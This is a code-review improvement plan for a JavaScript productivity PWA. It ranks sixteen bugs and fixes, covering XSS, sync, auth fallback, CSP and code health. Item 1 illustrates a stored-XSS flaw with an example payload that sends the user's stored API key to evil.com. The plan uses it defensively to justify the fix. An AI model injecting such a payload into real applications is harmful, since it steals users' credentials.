# Givelink / Task OS — Improvement Plan

> Generated: 2026-06-05  
> Codebase: `index.html` (12,888 lines, 872 KB) + `givelink.html` (1,755 lines) + `sw.js`  
> Architecture: Vanilla JS PWA, no build system, localStorage primary store, Supabase cloud sync

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. XSS: task titles execute as HTML inside `toast()` and `showConfirm()`
**What:** `toast()` sets `el.innerHTML = msg` — any caller that interpolates user-controlled data (task titles, goal names) enables stored XSS.  
**Where:** `index.html:2273` (`toast`), `index.html:2291` (`showConfirm`), `index.html:3497` (caller: `toast('✅ Completed: '+t.title)`)  
**Why it matters:** A task title like `<img src=x onerror="fetch('https://evil.com?k='+localStorage.getItem('taskos_api_key'))">` silently exfiltrates the Claude API key when the task is completed. User-entered content is stored and re-rendered constantly.  
**Effort:** S  
**Suggested fix:**
- In `toast()` (line 2273): change `el.innerHTML = msg` → `el.textContent = msg`. Toast messages never need HTML; emoji and text render fine via `textContent`.
- In `showConfirm()` (line 2291): change `document.getElementById('confirm-msg').innerHTML = msg` → `document.getElementById('confirm-msg').textContent = msg`.
- Audit the ~12 callers at lines 5625, 5629, 5639 etc. that pass static strings with emoji — they work identically with `textContent`.

---

### 2. Broken push notification icon path in service worker
**What:** `sw.js` references `./icons/icon-192.png` for push notifications, but that directory does not exist in the repo. Push notifications display with a broken/blank icon.  
**Where:** `sw.js:38-39`  
**Why it matters:** Every scheduled reminder or ntfy.sh notification shows as icon-less on Android and iOS, degrading the native-app feel this PWA was specifically optimized for (see commit #45).  
**Effort:** S  
**Suggested fix:**
- Change line 38: `icon: './icons/icon-192.png'` → `icon: './icon.svg'`
- Change line 39: `badge: './icons/icon-192.png'` → `badge: './icon.svg'`
- Optionally generate a 192×192 PNG from `icon.svg` and add it to the repo for better badge rendering on Android.

---

### 3. AI calls hang indefinitely — no fetch timeout or recovery path
**What:** `callClaude()` uses `fetch()` with no `AbortController` or timeout. If Anthropic is slow or the request stalls, the AI button stays disabled and the spinner never resolves. Only a page refresh recovers the UI.  
**Where:** `index.html:4130–4145` (`callClaude`), affects all 10+ `_aiLock` callsites.  
**Why it matters:** AI features are a core value-prop; a hung request makes the feature feel broken and trains users to distrust it. No timeout = no recovery without reload.  
**Effort:** S  
**Suggested fix:**
- Add an `AbortController` with a 30-second timeout inside `callClaude()`:
  ```js
  const ctrl = new AbortController();
  const tid = setTimeout(() => ctrl.abort(), 30000);
  const res = await fetch(url, { ..., signal: ctrl.signal });
  clearTimeout(tid);
  ```
- Catch `AbortError` separately and show `toast('AI request timed out — try again')`.
- Call `_aiUnlock(key)` in the timeout path so subsequent calls aren't blocked by the stale lock.

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 4. Wrong password silently triggers account creation
**What:** In `sbConnect()`, if a user types the wrong password, the app catches the auth failure and immediately attempts to sign up a new account with those credentials instead of showing "Wrong password."  
**Where:** `index.html:8572–8578`  
**Why it matters:** A returning user who misremembers their password gets a "confirm your email" prompt for a ghost account, never logs into their real account, and may think their data is gone. Support-call risk.  
**Effort:** S  
**Suggested fix:**
- Parse the error response body from `_sbAuth` before falling back to signup. Supabase returns `{ error: "Invalid login credentials" }` for 400 errors.
- Only fall back to signup if the HTTP status is 404 (user not found), not 400 (wrong password).
- Show a specific `toast('Wrong password — try again')` for 400 errors.

---

### 5. Sync only pushes on change — remote changes missed until page reload
**What:** `_sbScheduleSync()` calls `sbPush()` only. If the same user edits on a second device, the first device never pulls those changes unless it's manually refreshed or the page is reloaded.  
**Where:** `index.html:8628–8634`  
**Why it matters:** Cloud sync was prominently added in commit #50 as a multi-device feature. Users will see stale data on their secondary device, eroding trust in the sync feature.  
**Effort:** S  
**Suggested fix:**
- Replace `sbPush()` in `_sbScheduleSync` with a call to `sbSyncNow()` (which already handles pull-then-push conflict resolution).
- Alternatively, schedule pulls on a separate interval (e.g., every 60s) and pushes on the existing 2.5s debounce — pushing fast, pulling slow.

---

### 6. Data import overwrites all state with no warning
**What:** `importData()` merges imported JSON over `S` and saves immediately. There is no confirmation dialog. A mis-click or wrong file destroys all current data (habits, logs, tasks) irreversibly in localStorage.  
**Where:** `index.html:2115–2130`  
**Why it matters:** The export/import flow is the only non-Supabase backup path. Data loss from accidental import has no recovery without a prior export.  
**Effort:** S  
**Suggested fix:**
- Wrap the import logic in `showConfirm('Replace ALL local data with this file? This cannot be undone.', ok => { if(!ok) return; /* apply */ }, { okLabel: 'Replace', danger: true })`.
- Consider auto-exporting the current state to a timestamped file before applying the import as a safety net.

---

### 7. localStorage quota exhaustion has no graceful degradation
**What:** The entire app state (tasks, habits, health logs, finance entries, OKRs, network people, Givelink history…) is serialized as one JSON blob into `localStorage`. On active use, this can easily exceed the 5–10 MB browser limit. The `QuotaExceededError` handler shows a toast but takes no action.  
**Where:** `index.html:2097–2107` (`save()`), `index.html:2101–2103` (error handler)  
**Why it matters:** A power user with months of data will hit this wall. When they do, `save()` silently fails for all subsequent changes — they lose work without knowing it.  
**Effort:** M  
**Suggested fix:**
- After the `QuotaExceededError` toast, auto-trigger `exportData()` so the user has a backup before data stops saving.
- Split high-volume append-only arrays (`healthLogs`, `financeEntries`, `givelinkHistory`, `deepWorkSessions`) into separate localStorage keys so they can be pruned independently without touching the core task data.
- Add a localStorage usage meter in Settings (current size vs. 5 MB limit).

---

### 8. Claude API key onboarding is a cold-start wall
**What:** Every AI feature guards with `if(!S.claudeKey){ toast('Add Claude API key in Settings first'); return null; }` — there is no trial, no guided setup link, and no in-context explanation of where to get a key.  
**Where:** `index.html:4131`, Settings panel (~line 8489–8501)  
**Why it matters:** First-time users who click an AI button get a dead-end toast with no next step. Anthropic API key setup is non-trivial for non-developers; this is a conversion killer.  
**Effort:** M  
**Suggested fix:**
- Change the toast to include a direct link: `'<a href="https://console.anthropic.com/account/keys" target="_blank">Get a Claude API key</a> and paste it in Settings → AI.'` (Fix P0 item 1 first so HTML in toast is safe, or open the settings panel directly instead.)
- Add an inline "Why do I need this?" tooltip in the Settings panel next to the API key input.
- Consider a Vercel Edge Function proxy so the key lives server-side and users don't need their own key at all (eliminates this friction entirely but requires a billing decision).

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 9. 12,888-line monolithic index.html
**What:** The entire app — CSS (~2,000 lines), HTML structure, and JavaScript (~10,000 lines across 150+ functions and 30+ view renderers) — lives in one file. There is no build step, no modules, no code splitting.  
**Where:** `index.html` (entire file)  
**Why it matters:** Any feature addition risks breaking unrelated views. Debugging requires grepping a single 872 KB file. Browser parses and compiles all JS on every cold start, even for views the user never visits.  
**Effort:** L  
**Suggested fix:**
- Phase 1 (quick win): Extract `<style>` to `styles.css` and reference it via `<link>`. Reduces HTML file by ~2,000 lines with zero behavior change.
- Phase 2: Extract `sw.js`-adjacent utility functions (`save`, `load`, `toast`, `callClaude`, Supabase sync) to `core.js` via `<script src>`.
- Phase 3: Use native ES modules (`<script type="module">`) and split view renderers into separate files loaded on demand.

---

### 10. `unsafe-inline` in Content-Security-Policy nullifies XSS protection
**What:** `vercel.json` sets `script-src 'self' 'unsafe-inline'`, which allows any inline `<script>` or `onclick` attribute to execute. This makes the CSP header ineffective against the XSS vectors identified in P0.  
**Where:** `vercel.json:14`  
**Why it matters:** CSP is the last line of defense if an XSS payload is injected. With `unsafe-inline`, an attacker who can write to the DOM (via the bugs in item 1) faces no browser-level barrier.  
**Effort:** L  
**Suggested fix:**
- Short term: Fix the innerHTML XSS vectors (P0 item 1) to remove the actual attack surface.
- Long term: After extracting JS to external files (P2 item 9), replace `'unsafe-inline'` with a `'strict-dynamic'` + per-request nonce via a Vercel Edge Middleware that injects `<script nonce="...">` into HTML responses.

---

### 11. `_autoSnapshot()` silently swallows all errors
**What:** The Givelink auto-snapshot function has an empty `catch(e){}` — any failure (corrupt state, storage error, date parsing) is silently discarded.  
**Where:** `index.html:8638–8652`  
**Why it matters:** The Pace Engine trend charts depend on this data. If snapshots stop working (e.g., after a state schema change), the Givelink dashboard silently shows flatlined trends with no diagnostic path.  
**Effort:** S  
**Suggested fix:**
- Replace `catch(e){}` with `catch(e){ console.warn('autoSnapshot error', e); }` at minimum.
- Optionally surface a one-time toast if snapshots have been failing for >3 days (compare last snapshot date against today).

---

### 12. Inline hardcoded hex colors bypass the CSS variable system
**What:** The codebase defines a clean CSS variable system (`--accent`, `--brand`, `--brand2`, etc.) but dozens of inline `style="color:#f783ac"`, `style="color:#58a6ff"`, `style="background:#ef4444"` bypass it, making theming and brand updates require grep-and-replace across the file.  
**Where:** `index.html` — representative examples at lines 524, 532, 616, 655, 7471, 11202; ~50+ occurrences total.  
**Why it matters:** Light/dark theme switching already works via CSS variables. Every hardcoded hex color is a theming bug waiting to happen (wrong color in the wrong theme) and makes future brand updates painful.  
**Effort:** M  
**Suggested fix:**
- Add semantic variables for the colors that repeat most: `--danger: #ef4444`, `--success: #69db7c`, `--warning: #ffa94d`, `--info: #58a6ff`.
- Run a targeted replacement pass: `style="color:#ef4444"` → `style="color:var(--danger)"` etc.
- Enforce via a PR checklist item: "No bare hex colors in `style=` attributes."

---

### 13. Service worker cache key is manually maintained — stale assets risk
**What:** `sw.js` line 1 hardcodes `const CACHE = 'task-os-20260530'`. The date must be manually updated on each deploy, and if forgotten, returning users get cached old HTML while the server has new code.  
**Where:** `sw.js:1`  
**Why it matters:** The app ships multiple commits per week. A forgotten cache bump means users see bugs that were already fixed, or worse, new features that expect updated state schemas hit old cached code.  
**Effort:** S  
**Suggested fix:**
- Add a deploy script (or Vercel build command) that replaces the cache string with a git SHA or timestamp: `sed -i "s/task-os-[0-9]*/task-os-$(git rev-parse --short HEAD)/" sw.js`.
- Alternatively, add a `version` field to `manifest.json` and have `sw.js` read it on install.

---

## 💡 P3 — Nice to have

### 14. Brand color palette in app doesn't match spec
**What:** The stated brand palette is purple `#6B3FA0`/`#5718CA` and pink `#C2185B`/`#E353B6`. The app uses `#9333ea`/`#bc8cff`/`#cc5de8` for purple and `#f783ac`/`#db2777`/`#f472b6` for pink — a different hue and lightness family.  
**Where:** `index.html:25` (dark mode CSS vars), `index.html:33` (light mode CSS vars)  
**Why it matters:** If external brand materials (pitch decks, landing page, social) use the spec palette and the app uses a different one, the product feels inconsistent to investors and nonprofit partners evaluating Givelink.  
**Effort:** S  
**Suggested fix:**
- Update `--cg` (Goals purple) and `--brand2` to `#6B3FA0` (dark) / `#5718CA` (light).
- Update `--cb` (pink accent) and `--pr` in `givelink.html` to `#C2185B` (dark) / `#E353B6` (light).
- Visually verify contrast ratios after the change — `#5718CA` on dark backgrounds may need a lighter tint for WCAG AA text contrast.

---

### 15. PWA share target declared but not handled in JS
**What:** `manifest.json` declares a `share_target` that accepts `title`, `text`, and `url` parameters, but `index.html` has no handler that reads these URL params on load and pre-fills the task creation modal.  
**Where:** `manifest.json` (share_target config), `index.html` (no corresponding handler)  
**Why it matters:** "Share to Task OS" appears as an option in the Android/iOS share sheet, but tapping it just opens the home screen with no action taken — a confusing dead end.  
**Effort:** S  
**Suggested fix:**
- On `DOMContentLoaded`, check `new URLSearchParams(location.search)` for `title`, `text`, and `url` params.
- If present, call `openAdd()` with the shared content pre-filled in the task title input.
- Clear the URL params after capture to prevent re-triggering on refresh.

---

### 16. `givelink.html` duplicates toast, confirm, and utility logic from `index.html`
**What:** `givelink.html` contains its own CSS, toast system, modal helpers, and utility functions that are largely copy-pasted from `index.html`. Any bug fix to shared logic (like the XSS fix in P0 item 1) must be applied twice.  
**Where:** `givelink.html:1–1755` (entire file)  
**Why it matters:** The P0 XSS fix in `toast()` will need to be replicated manually in `givelink.html`. This is a maintenance risk that compounds with every subsequent fix.  
**Effort:** M  
**Suggested fix:**
- Extract shared utilities (`toast`, `showConfirm`, `esc`, theme toggle) to `shared.js`.
- Load it in both HTML files via `<script src="shared.js">`.
- This also reduces the combined codebase by ~200–400 lines of duplication.

---

*Total items: 16 across 4 tiers. P0 items (1–3) can all be shipped in < 1 day. P1 items (4–8) are independently deliverable in a single sprint.*
